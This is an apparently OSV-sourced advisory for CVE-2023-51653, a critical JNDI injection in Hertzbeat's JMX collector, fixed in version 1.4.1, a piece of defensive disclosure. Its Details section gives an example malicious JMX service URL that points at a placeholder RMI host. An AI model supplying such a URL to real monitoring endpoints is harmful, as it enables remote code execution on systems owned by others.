# [C] Hertzbeat JMX JNDI RCE

## Summary
Severity: Critical
Advisory: CVE-2023-51653
Aliases: GHSA-gcmp-vf6v-59gg
CVSS: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
Published: 2024-02-22
Source: https://osv.dev/vulnerability/CVE-2023-51653
Type: osv

## Details
Hertzbeat is a real-time monitoring system. In the implementation of `JmxCollectImpl.java`, `JMXConnectorFactory.connect` is vulnerable to JNDI injection. The corresponding interface is `/api/monitor/detect`. If there is a URL field, the address will be used by default. When the URL is `service:jmx:rmi:///jndi/rmi://xxxxxxx:1099/localHikari`, it can be exploited to cause remote code execution. Version 1.4.1 contains a fix for this issue.

## References
- https://github.com/CVEProject/cvelistV5/tree/main/cves/2023/51xxx/CVE-2023-51653.json
- https://github.com/dromara/hertzbeat/security/advisories/GHSA-gcmp-vf6v-59gg
- https://nvd.nist.gov/vuln/detail/CVE-2023-51653
- https://github.com/dromara/hertzbeat/commit/f794b0d82be49c596c04a042976446559eb315ef
